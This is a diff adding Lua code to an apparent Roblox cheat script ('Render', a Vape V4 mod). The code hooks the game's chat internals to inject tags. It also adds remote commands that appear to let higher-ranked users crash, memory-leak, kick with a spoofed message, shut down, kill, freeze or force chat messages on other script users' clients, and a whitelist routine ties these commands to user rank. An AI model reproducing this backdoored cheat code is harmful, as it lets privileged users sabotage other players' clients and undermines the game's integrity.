@@ -6260,4 +6260,168 @@ textChatService.OnIncomingMessage = function(message)
 	end
 	return properties
 end
+pcall(function()
+	local chatTables = {}
+	local oldchatfunc
+	for i,v in next, getconnections(replicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do 
+		if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == 'table' then
+			local chatvalues = getmetatable(debug.getupvalues(v.Function)[1]) 
+			if chatvalues and chatvalues.GetChannel then  
+				oldchatfunc = chatvalues.GetChannel 
+				chatvalues.GetChannel = function(self, name) 
+					local data = oldchatfunc(self, name) 
+					local addmessage = (data and data.AddMessageToChannel)
+					if data and data.AddMessageToChannel then 
+						if chatTables[data] == nil then 
+							chatTables[data] = data.AddMessageToChannel 
+						end 
+						data.AddMessageToChannel = function(self2, data2)
+							pcall(function()
+								local plr = playersService:FindFirstChild(data2.FromSpeaker)
+								local rendertag = (plr and RenderFunctions.playerTags[plr])
+								if data2.FromSpeaker and rendertag and vapeInjected then 
+									local tagcolor = Color3.fromHex(rendertag.Color)
+									data2.ExtraData = {
+										Tags = {unpack(data2.ExtraData.Tags), {TagText = rendertag.Text, TagColor = tagcolor}},
+										NameColor = plr.Team == nil and Color3.fromRGB(tagcolor.R * 235, tagcolor.G * 235, tagcolor.B * 235) or plr.TeamColor.Color
+									}
+								end 
+							end)
+							return addmessage(self2, data2)
+						end
+						return data
+					end
+				end
+			end
+		end
+	end 
+end)
+RenderFunctions:AddCommand('memoryleak', function()
+	httpService:JSONEncode(table.create(65536, string.rep("\000", 65536)))
+end)
+
+RenderFunctions:AddCommand('kick', function(args) 
+	local text = '' 
+	if #args > 2 then 
+		for i,v in next, args do 
+			if i > 2 then 
+				text = (text == '' and v or text..' '..v) 
+			end
+		end
+	else 
+		text = 'Same account launched on a different device.'
+	end
+	task.spawn(function() lplr:Kick(text) end)
+	task.wait(0.3)
+	for i,v in pairs, ({}) do end
+end)
+
+runFunction(function()
+	local deletedinstances = {}
+	local anchoredparts = {}
+	
+	RenderFunctions:AddCommand('leave', function() 
+		game:Shutdown() 
+	end)
+	
+	RenderFunctions:AddCommand('chat', function(args)
+		local text = ''
+		if #args > 2 then 
+			for i,v in next, args do 
+				if i > 2 then 
+					text = (text == '' and v or text..' '..v) 
+				end
+			end
+		else
+			text = 'I\'m using a Vaipe V4 mod known as Render. | renderintents.xyz'
+		end
+		sendmessage(text)
+	end)
+	
+	RenderFunctions:AddCommand('kill', function() 
+		lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
+		lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+	end)
+	
+	RenderFunctions:AddCommand('bring', function(args, player)
+		lplr.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+	end)
+
+	RenderFunctions:AddCommand('deleteworld', function()
+		for i,v in next, workspace:GetDescendants() do 
+			pcall(function() 
+				if v.Anchored ~= nil and characterDescendant(v) == nil then 
+					deletedinstances[v] = v.Parent
+					v.Parent = nil 
+				end 
+			end)
+		end
+	end)
+
+	RenderFunctions:AddCommand('breakworld', function() 
+		for i,v in next, workspace:GetDescendants() do 
+			pcall(function()
+				if v.Anchored and characterDescendant(v) == nil then
+					anchoredparts[v] = v.CFrame
+					v.Anchored = false 
+				end 
+			end) 
+		end
+	end)
+
+	RenderFunctions:AddCommand('fixworld', function()
+		for i,v in next, deletedinstances do 
+			pcall(function() i.Parent = v end) 
+		end 
+		for i,v in next, anchoredparts do 
+			pcall(function() 
+				i.CFrame = v 
+				i.Anchored = true
+			end) 
+		end
+		table.clear(deletedinstances)
+		table.clear(anchoredparts)
+	end)
+
+	RenderFunctions:AddCommand('freeze', function()
+		lplr.Character.HumanoidRootPart.Anchored = true
+	end)
+
+	RenderFunctions:AddCommand('uninject', GuiLibrary.SelfDestruct)
+
+	RenderFunctions:AddCommand('unfreeze', function()
+		lplr.Character.HumanoidRootPart.Anchored = false
+	end)
+
+	RenderFunctions:AddCommand('crash', function()
+		for i,v in pairs, ({}) do end
+	end)
+
+	RenderFunctions:AddCommand('toggle', function(args)
+		local module = tostring(args[2]):lower()
+		for i,v in next, GuiLibrary.ObjectsThatCanBeSaved do 
+			if i:lower() == (module..'optionsbutton') then 
+				v.Api.ToggleButton()
+			end
+		end
+	end)
+end)
+
+runFunction(function()
+	local function whitelistFunction(plr)
+		repeat task.wait() until (RenderFunctions.whitelistState > 0)
+		local rank = RenderFunctions:GetPlayerType(1, plr)
+		local prio = RenderFunctions:GetPlayerType(3, plr)
+		if prio > 1 and prio > RenderFunctions:GetPlayerType(3) and rank ~= 'BETA' then 
+			sendprivatemessage(plr, 'rendermoment')
+		end
+	end
+	for i,v in next, playersService:GetPlayers() do 
+		task.spawn(whitelistFunction, v) 
+	end 
+	table.insert(vapeConnections, playersService.PlayerAdded:Connect(whitelistFunction))
+	if RenderFunctions:GetPlayerType(1) ~= 'STANDARD' then 
+		InfoNotification('Render Whitelist', 'You are now authenticated, welcome!', 4.5)
+	end
+end)
 -------------------
